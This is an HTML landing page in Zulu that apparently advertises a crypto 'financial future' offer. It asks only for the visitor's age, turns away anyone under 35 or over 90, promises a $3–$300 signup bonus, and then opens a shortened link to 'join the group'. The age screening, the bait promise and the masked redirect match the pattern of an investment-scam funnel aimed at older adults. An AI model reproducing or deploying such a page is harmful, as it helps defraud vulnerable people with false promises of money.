<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vula Ikusasa Lezezimali</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'crypto-blue': '#00D4FF',
                        'crypto-purple': '#8B5CF6',
                        'crypto-dark': '#0B0B0F',
                        'crypto-gray': '#1A1A23'
                    },
                    animation: {
                        'breathing': 'breathing 3s ease-in-out infinite',
                        'float': 'float 6s ease-in-out infinite',
                        'glow': 'glow 2s ease-in-out infinite alternate'
                    },
                    keyframes: {
                        breathing: {
                            '0%, 100%': { transform: 'scale(1)', boxShadow: '0 0 20px rgba(0, 212, 255, 0.5)' },
                            '50%': { transform: 'scale(1.05)', boxShadow: '0 0 30px rgba(0, 212, 255, 0.8)' }
                        },
                        float: {
                            '0%, 100%': { transform: 'translateY(0px)' },
                            '50%': { transform: 'translateY(-20px)' }
                        },
                        glow: {
                            '0%': { textShadow: '0 0 20px rgba(0, 212, 255, 0.5)' },
                            '100%': { textShadow: '0 0 30px rgba(0, 212, 255, 0.8), 0 0 40px rgba(139, 92, 246, 0.5)' }
                        }
                    }
                }
            }
        }
    </script>
    <style>
        body {
            background: linear-gradient(135deg, #0B0B0F 0%, #1A1A23 50%, #2D1B69 100%);
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
        
        .star {
            position: absolute;
            width: 2px;
            height: 2px;
            background: white;
            border-radius: 50%;
            animation: twinkle 3s infinite;
        }
        
        @keyframes twinkle {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 1; }
        }
        
        .content-wrapper {
            position: relative;
            z-index: 10;
        }
        
        .glass-effect {
            backdrop-filter: blur(10px);
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .input-glow:focus {
            box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
            border-color: #00D4FF;
        }
    </style>
</head>
<body class="text-white font-sans">
    <!-- Animated Stars Background -->
    <div class="stars" id="stars"></div>
    <div class="content-wrapper min-h-screen flex items-center justify-center px-4 py-8">
        <div class="max-w-2xl w-full text-center">
            <!-- Hero Image -->
            <div class="mb-4 md:mb-8 animate-float">
                <img src="https://www.nhua614we.shop/b2/img/1.jpg" 
                     alt="Future Finance" 
                     class="w-48 h-48 md:w-64 md:h-64 mx-auto rounded-full object-cover shadow-2xl border-4 border-crypto-blue/30"
                     onerror="this.style.display='none'">
            </div>
            
            <!-- Main Heading -->
            <h1 class="text-3xl md:text-6xl font-bold mb-3 md:mb-6 animate-glow bg-gradient-to-r from-crypto-blue via-crypto-purple to-crypto-blue bg-clip-text text-transparent">
                Vula Ikusasa Lezezimali
            </h1>
            
            <!-- Subheading -->
            <p class="text-lg md:text-2xl mb-6 md:mb-12 text-gray-300 leading-relaxed">
                Uyakulungela? Isango lempumelelo yezezimali liyavuleka...
            </p>
            
            <!-- Registration Form -->
            <div class="glass-effect rounded-2xl p-6 md:p-12 mx-auto max-w-md mb-8 md:mb-0">
                <form id="registrationForm" class="space-y-4 md:space-y-6">
                    <div>
                        <label for="age" class="block text-sm font-medium text-gray-300 mb-3">
                            Iminyaka Yakho
                        </label>
                        <input 
                            type="text" 
                            id="age" 
                            name="age" 
                            required
                            inputmode="numeric"
                            pattern="[0-9]*"
                            autocomplete="off"
                            autocorrect="off"
                            autocapitalize="off"
                            spellcheck="false"
                            class="w-full px-4 py-4 text-base bg-crypto-gray/50 border border-gray-600 rounded-lg text-white placeholder-gray-400 input-glow transition-all duration-300 focus:outline-none focus:ring-2 focus:ring-crypto-blue/50"
                            placeholder="Faka iminyaka yakho"
                        >
                    </div>
                    
                    <div class="text-sm text-gray-400 bg-crypto-gray/30 p-4 rounded-lg border border-crypto-blue/20">
                        <p class="flex items-center">
                            <span class="text-crypto-blue mr-2">üí∞</span>
                            Qaphela: Thola ibhonasi lokubhalisa le-$3-$300 ngemva kokubhalisa
                        </p>
                    </div>
                    
                    <button 
                        type="submit" 
                        class="w-full py-4 bg-gradient-to-r from-crypto-blue to-crypto-purple text-white font-bold rounded-lg animate-breathing hover:scale-105 transition-all duration-300 text-lg shadow-lg border-0 -webkit-appearance-none appearance-none"
                        style="background: linear-gradient(90deg, #00D4FF 0%, #8B5CF6 100%); border: none; outline: none;"
                    >
                        Thumela Ukubhalisa
                    </button>
                </form>
            </div>
        </div>
    </div>
    
    <!-- Custom Modal -->
    <div id="customModal" class="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 hidden">
        <div class="glass-effect rounded-2xl p-8 max-w-sm w-full mx-4 text-center border border-red-500/30">
            <div class="text-red-400 text-5xl mb-4">‚ö†Ô∏è</div>
            <h3 class="text-xl font-bold mb-4 text-white">Isidingo Seminyaka</h3>
            <p class="text-gray-300 mb-6">Akufinyelelani izidingo zokujoyina</p>
            <button 
                onclick="closeModal()" 
                class="px-6 py-3 bg-gradient-to-r from-red-500 to-red-600 text-white rounded-lg hover:from-red-600 hover:to-red-700 transition-all duration-300 font-medium"
            >
                KULUNGILE
            </button>
        </div>
    </div>

    <!-- Bonus Modal -->
    <div id="bonusModal" class="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 hidden">
        <div class="glass-effect rounded-2xl p-8 max-w-sm w-full mx-4 text-center border border-crypto-blue/30">
            <div class="text-crypto-blue text-5xl mb-4">üí∞</div>
            <h3 class="text-xl font-bold mb-4 text-white">Ukuthunyelwa kuqediwe</h3>
            <p class="text-gray-300 mb-6">Joyina iqembu ukuze uthole umklomelo we-$3-$300</p>
            <button 
                onclick="confirmBonus()" 
                class="px-6 py-3 bg-gradient-to-r from-crypto-blue to-crypto-purple text-white rounded-lg hover:scale-105 transition-all duration-300 font-medium"
            >
                KULUNGILE
            </button>
        </div>
    </div>

    <script>
        // Dark mode support
        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
            document.documentElement.classList.add('dark');
        }
        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', event => {
            if (event.matches) {
                document.documentElement.classList.add('dark');
            } else {
                document.documentElement.classList.remove('dark');
            }
        });

        // Create animated stars
        function createStars() {
            const starsContainer = document.getElementById('stars');
            const numberOfStars = 100;
            
            for (let i = 0; i < numberOfStars; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                star.style.left = Math.random() * 100 + '%';
                star.style.top = Math.random() * 100 + '%';
                star.style.animationDelay = Math.random() * 3 + 's';
                star.style.opacity = Math.random() * 0.8 + 0.2;
                starsContainer.appendChild(star);
            }
        }

        // Custom modal functions
        function showModal() {
            document.getElementById('customModal').classList.remove('hidden');
            // Clear the input field when showing error modal
            document.getElementById('age').value = '';
        }

        function closeModal() {
            document.getElementById('customModal').classList.add('hidden');
        }

        // t2 method for navigation
        function t2() {
            window.open('https://url66.xyz/s/ENp4NwY78', '_blank');
        }

        // Form submission handler
        document.getElementById('registrationForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const age = parseInt(document.getElementById('age').value);
            
            if (age < 35 || age > 90) {
                showModal();
            } else {
                // Age is valid, show bonus modal first
                showBonusModal();
            }
        });

        // Initialize stars on load
        document.addEventListener('DOMContentLoaded', function() {
            createStars();
        });

        // Bonus modal functions
        function showBonusModal() {
            document.getElementById('customModal').classList.add('hidden');
            document.getElementById('bonusModal').classList.remove('hidden');
        }

        function confirmBonus() {
            document.getElementById('bonusModal').classList.add('hidden');
            t2();
        }

        // Close modal when clicking outside
        document.getElementById('customModal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeModal();
            }
        });

        document.getElementById('bonusModal').addEventListener('click', function(e) {
            if (e.target === this) {
                document.getElementById('bonusModal').classList.add('hidden');
            }
        });
    </script>
</body>
</html>
